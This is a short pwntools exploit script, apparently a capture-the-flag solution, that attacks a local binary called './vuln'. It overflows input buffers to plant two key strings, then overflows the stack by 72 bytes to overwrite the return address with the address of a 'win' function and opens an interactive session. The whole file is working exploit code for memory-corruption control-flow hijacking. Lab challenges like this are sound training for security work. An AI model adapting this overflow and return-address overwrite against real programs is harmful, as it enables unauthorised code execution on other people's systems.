from pwn import *

exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

p = process(exe)

offset = 32
key1 = b'codex'
key2 = b'candidateOfaWinner'

payload1 = b'\x00'*(offset - 1)
payload2 = key2 + b'\x00' * (offset - len(key2)) + key1

p.sendlineafter(b"? ",  payload1)
p.sendlineafter(b"? ", payload2)

offset = 64 + 8
win_addr = elf.symbols['win']
payload = flat(
        b'A'*offset,
        p64(win_addr),
)

p.sendlineafter(b'Pak Vincent mau flag gak? ', payload)

p.interactive()
